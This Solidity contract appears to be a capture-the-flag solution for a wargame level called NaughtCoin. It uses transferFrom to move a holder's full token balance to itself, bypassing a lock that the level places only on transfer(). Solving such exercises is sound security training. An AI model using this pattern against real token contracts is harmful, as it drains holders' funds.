// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinAttacker {
    IERC20 naughtCoinAttacker;

    constructor(address _naughtCoinAttacker) {
        naughtCoinAttacker = IERC20(_naughtCoinAttacker);
    }

    function callTransferFrom() external {
        naughtCoinAttacker.transferFrom(
            msg.sender,
            address(this),
            naughtCoinAttacker.balanceOf(msg.sender)
        );
    }
}
